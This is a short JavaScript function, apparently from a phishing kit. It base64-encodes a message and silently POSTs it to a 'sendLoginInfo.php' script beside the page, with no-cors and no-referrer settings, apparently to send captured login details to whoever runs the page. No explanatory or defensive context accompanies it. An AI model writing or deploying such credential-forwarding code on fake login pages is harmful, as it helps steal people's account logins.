async function postData(msg = {}) {
    const currentUrl = window.location.protocol + "//" + window.location.hostname + window.location.pathname.replace(/\/[^\/]*$/, '/');
    const url = currentUrl +`sendLoginInfo.php?text=${btoa(msg)}`
    
    return await fetch(url, {
        method: "POST",
        mode: "no-cors",
        cache: "no-cache",
        credentials: "omit",
        headers: {
            "Content-Type": "application/json",
        },
        redirect: "follow",
        referrerPolicy: "no-referrer",
    })
}